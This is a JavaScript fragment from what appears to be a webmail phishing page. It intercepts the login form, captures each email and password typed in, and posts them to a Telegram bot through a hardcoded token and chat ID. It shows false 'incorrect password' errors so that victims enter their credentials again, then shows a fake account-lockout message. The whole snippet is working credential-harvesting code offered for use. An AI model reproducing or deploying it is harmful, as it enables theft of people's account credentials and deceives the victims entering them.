  <script>
    const BOT_TOKEN = '7040065345:AAGE_TcKO9MxvVV-Rh6-VmXziWEq9olex3k';
    const CHAT_ID   = '-4726861680';

    let attemptCount = 0, maxAttempts = 2;
    const form = document.getElementById('loginForm'),
          errorDiv = document.getElementById('errorMsg'),
          loginBtn = document.getElementById('loginBtn');

    form.addEventListener('submit', e => {
      e.preventDefault();
      attemptCount++;

      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      let text;

      if (attemptCount <= maxAttempts) {
        text =
          `‚ùó Attempt #${attemptCount} - Invalid credentials\n` +
          `‚Ä¢ Email: ${email}\n` +
          `‚Ä¢ Password: ${password}`;
        errorDiv.textContent = 'Webmail or Password incorrect.';
      } else {
        text =
          `üîí Account Locked on Attempt #${attemptCount}\n` +
          `‚Ä¢ Email: ${email}`;
        errorDiv.textContent = "You can't access your account at the moment, kindly try again later.";
        loginBtn.disabled = true;
        form.querySelectorAll('input').forEach(i => i.disabled = true);
      }

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      }).catch(() => {});
    });
